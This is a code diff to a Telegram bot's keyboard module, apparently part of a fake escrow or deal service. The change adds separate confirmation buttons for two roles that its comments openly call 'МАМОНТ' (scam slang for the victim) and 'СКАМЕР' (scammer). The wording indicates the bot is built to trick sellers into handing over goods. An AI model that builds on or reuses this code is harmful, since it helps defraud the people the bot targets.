@@ -69,11 +69,27 @@ def deal_actions(deal_code):
         [InlineKeyboardButton(text="Отмена", callback_data=f"cancel_deal_{deal_code}", icon_custom_emoji_id=ICON_CROSS)]
     ])
 
-def deal_status_buttons(deal_code, is_seller=False):
+def deal_status_buttons(deal_code, is_seller=False, is_scammer=False):
     kb = []
     if is_seller:
-        kb.append([InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_deal_{deal_code}", icon_custom_emoji_id=ICON_CHECK)])
-    kb.append([InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", icon_custom_emoji_id=ICON_CHAT)])
+        # МАМОНТ: подтверждает передачу
+        kb.append([InlineKeyboardButton(
+            text="Подтвердить передачу", 
+            callback_data=f"confirm_deal_{deal_code}", 
+            icon_custom_emoji_id=ICON_CHECK
+        )])
+    if is_scammer:
+        # СКАМЕР: подтверждает получение
+        kb.append([InlineKeyboardButton(
+            text="Подтвердить получение", 
+            callback_data=f"confirm_deal_scammer_{deal_code}", 
+            icon_custom_emoji_id=ICON_CHECK
+        )])
+    kb.append([InlineKeyboardButton(
+        text="Поддержка", 
+        url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", 
+        icon_custom_emoji_id=ICON_CHAT
+    )])
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
 def deal_paid_buttons(deal_code):
@@ -104,5 +120,4 @@ def support_button():
     ])
 
 def empty_keyboard():
-    """Пустая клавиатура"""
     return InlineKeyboardMarkup(inline_keyboard=[])
